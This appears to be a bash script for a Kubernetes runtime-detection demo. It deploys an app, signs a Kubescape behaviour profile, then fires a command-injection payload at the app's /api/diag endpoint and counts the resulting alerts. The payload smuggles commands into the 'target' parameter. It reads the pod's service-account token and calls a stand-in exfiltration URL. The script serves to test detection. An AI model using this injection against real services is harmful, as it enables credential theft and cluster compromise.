#!/usr/bin/env bash
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
SB="$ROOT/example/redis/distros/signed-bundles"
CP=containerprofiles.spdx.softwarecomposition.kubescape.io
NS=shop
cd "$ROOT"

echo "### build + push opsboard"
TAG="ttl.sh/opsboard-$(head -c4 /dev/urandom | xxd -p):24h"
docker buildx build -t "$TAG" --push "$HERE/opsboard"

echo "### deploy stack"
sed "s#IMAGE#$TAG#g" "$HERE/k8s/all.yaml" | kubectl apply -f -
kubectl -n "$NS" rollout status deploy/opsboard --timeout=180s

echo "### signed kubescape stack"
make kubescape
kubectl -n honey rollout status ds/node-agent --timeout=300s

echo "### learn opsboard SBoB"
kubectl -n "$NS" rollout restart deploy/opsboard
kubectl -n "$NS" rollout status deploy/opsboard --timeout=120s
until kubectl -n "$NS" get "$CP" -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.annotations.kubescape\.io/status}{"\n"}{end}' | grep -q 'opsboard.*completed'; do sleep 10; done

echo "### sign + bind SBoB (vendor key)"
[ -x "$SB/sign-object" ] || { curl -fsSL -o "$SB/sign-object" https://github.com/k8sstormcenter/node-agent/releases/download/sign-object-v0.1.6/sign-object-linux-amd64 && chmod +x "$SB/sign-object"; }
N=$(kubectl -n "$NS" get "$CP" -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | grep opsboard | head -1)
kubectl -n "$NS" get "$CP" "$N" -o json | python3 "$HERE/hack/cp-to-fragment.py" > "$HERE/frag-opsboard.yaml"
SIGN_OBJECT="$SB/sign-object" "$SB/sign-fragment.sh" "$HERE/frag-opsboard.yaml" "$SB/keys/vendor.pem"
kubectl -n "$NS" patch deploy opsboard --type merge -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":"opsboard-base"}}}}}'
kubectl -n "$NS" rollout status deploy/opsboard --timeout=120s
sleep 25

echo "### breakout: command injection via /api/diag"
kubectl -n "$NS" delete pod atk --ignore-not-found
kubectl -n "$NS" run atk --image=curlimages/curl:latest --restart=Never --command -- sh -c 'curl -s -m15 -G --data-urlencode "target=1.1.1.1
id
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -s -m5 https://example.com/exfil" http://opsboard:8080/api/diag; sleep 5'
sleep 35

echo "### expected detections (signed SBoB deviation)"
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false --since=2m | grep '"podNamespace":"shop"' | grep -oE '"RuleID":"R[0-9]+"' | sort | uniq -c | sort -rn
